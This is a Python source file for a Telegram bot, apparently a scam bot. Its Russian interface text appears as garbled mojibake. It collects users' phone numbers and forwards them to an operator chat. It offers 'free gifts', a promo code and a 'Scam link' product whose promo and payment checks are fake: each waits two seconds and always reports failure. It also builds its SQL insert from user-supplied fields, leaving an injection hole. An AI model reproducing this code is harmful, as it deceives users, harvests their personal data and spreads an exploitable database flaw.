import settings
import func
import keyboard

from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text
import asyncio

import sqlite3 as sql

from colorama import Fore, init
init(autoreset=True)

bot = Bot(settings.token)
dp = Dispatcher(bot)

#------------------–í–∫–ª—é—á–µ–Ω/–í—ã–∫–ª—é—á–µ–Ω------------------
async def on_startup(_):
    print(Fore.YELLOW + "INFO:", "–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω")
async def on_shutdown(_):
    print(Fore.YELLOW + "INFO:", "–ë–æ—Ç –≤—ã–∫–ª—é—á–µ–Ω")

#------------------–°—Ç–∞—Ä—Ç------------------
@dp.message_handler(commands=['start'])
async def start_command(message: types.message):
    if func.user(message.chat.id) is None:
        await bot.send_message(message.from_user.id, text=f'üëã –ü—Ä–∏–≤–µ—Ç, {message.from_user.first_name}!\n  –ü—Ä–æ–π–¥–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é –¥–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã', reply_markup=keyboard.kb_reg)
    else:
        await bot.send_message(message.from_user.id, text='üí™ –†–∞–¥ —Ç–µ–±—è —Å–Ω–æ–≤–∞ –≤–∏–¥–µ—Ç—å', reply_markup=keyboard.kb_menu)
    await message.delete()

#------------------–ü–æ–ª—É—á–µ–Ω–∏–µ –Ω–æ–º–µ—Ä–∞------------------
@dp.message_handler(content_types=['contact'])
async def contact(message: types.Message, state: FSMContext):
    conn = sql.connect("users.db")
    with conn:
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS `users` (user_id INT PRIMARY KEY, nick TEXT, number INT)")
        cursor.execute(f"INSERT OR IGNORE INTO `users` VALUES ('{message.chat.id}', '{message.from_user.first_name}', '{message.contact.phone_number}')")
        await message.answer('‚úÖ –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!', reply_markup=keyboard.kb_menu)
        if settings.ID != '':
            try:
                await bot.send_message(chat_id=settings.ID, text=f"–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å\n\n–ò–º—è:{message.from_user.first_name}\nID:{message.chat.id}\n–ù–æ–º–µ—Ä:{message.contact.phone_number}\n")
            except:
                print(Fore.RED + '–ù–µ–≤–µ—Ä–Ω—ã–π –∞–π–¥–∏')
        print(Fore.GREEN + "BOT:",f"–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å\n\n–ò–º—è:{message.from_user.first_name}\nID:{message.chat.id}\n–ù–æ–º–µ—Ä:{message.contact.phone_number}\n")

@dp.message_handler(content_types='text')
async def get_message(message: types.message):
    if func.user(message.chat.id) is not None:   #<-–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –≤ –±–∞–∑–µ

        #------------------–ü–æ–¥–∞—Ä–∫–∏------------------
        if message.text == '–ë–µ—Å–ø–ª–∞—Ç–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏':
            await bot.send_message(message.from_user.id, text='üéÅ –¢—É—Ç —Å–æ–±—Ä–∞–Ω—ã –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –¥–ª—è —Ç–µ–±—è', reply_markup=keyboard.kb_gifts)

        if message.text == '–ü—Ä–æ–º–æ–∫–æ–¥':
            await bot.send_message(message.from_user.id, text=f"{func.promo_text}", reply_markup=keyboard.ikb_promo)
    
        #------------------–ú–∞–≥–∞–∑–∏–Ω------------------
        if message.text == '–ú–∞–≥–∞–∑–∏–Ω':
            await bot.send_message(message.from_user.id, text='üõí –¢—É—Ç —Å–æ–±—Ä–∞–Ω—ã –≤—Å–µ —Ç–æ–≤–∞—Ä—ã –¥–ª—è —Ç–µ–±—è', reply_markup=keyboard.kb_shop)

        if message.text == 'Scam link':
            await bot.send_message(message.from_user.id, text=f"{func.Scamlink_text}", reply_markup=keyboard.ikb_scamlink)

        #------------------–ù–∞–∑–∞–¥------------------
        if message.text == '–ù–∞–∑–∞–¥':
            await bot.send_message(message.from_user.id, text='–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=keyboard.kb_menu)
            
    else:
        await bot.send_message(message.from_user.id, text="‚ùå –¢–µ–±—è –Ω–µ—Ç –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö!")

#------------------–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–æ–∫------------------
@dp.callback_query_handler()
async def get_promo_callback(callback: types.CallbackQuery):
    if callback.data == "get_promo":
        await callback.message.answer('üëÄ –ü—Ä–æ–≤–µ—Ä–∫–∞...')
        await asyncio.sleep(2)
        await callback.message.answer('‚ùå –ü–æ—Ö–æ–∂–µ —Ç—ã –Ω–µ –≤—ã–ø–æ–ª–Ω–∏–ª –æ–¥–Ω–æ –∏–∑ —É—Å–ª–æ–≤–∏–π.\n\n–ï—Å–ª–∏ —Ç—ã –≤—Å–µ –≤—ã–ø–æ–ª–Ω–∏–ª, –ø–æ–ø—Ä–æ–±—É–π —á–µ—Ä–µ–∑ 5 –º–∏–Ω—É—Ç.')
    if callback.data == 'buy':
        await callback.message.edit_text(text=f'{func.Scamlink_buy_text(callback.from_user.first_name)}', reply_markup=keyboard.ikb_in_buy_button)
    if callback.data == 'check':
        await callback.message.answer('üëÄ –ü—Ä–æ–≤–µ—Ä–∫–∞...')
        await asyncio.sleep(2)
        await callback.message.answer('‚ùå –û–ø–ª–∞—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞!\n\n–ü—Ä–æ–≤–µ–¥–∏—Ç–µ –æ–ø–ª–∞—Ç—É –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
    if callback.data == "buy_back":
         await callback.message.edit_text(text=f"{func.Scamlink_text}", reply_markup=keyboard.ikb_scamlink)


#------------------–®—Ç—É–∫–∞ –∫–∞–∫–∞—è-—Ç–æ------------------
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup, on_shutdown=on_shutdown)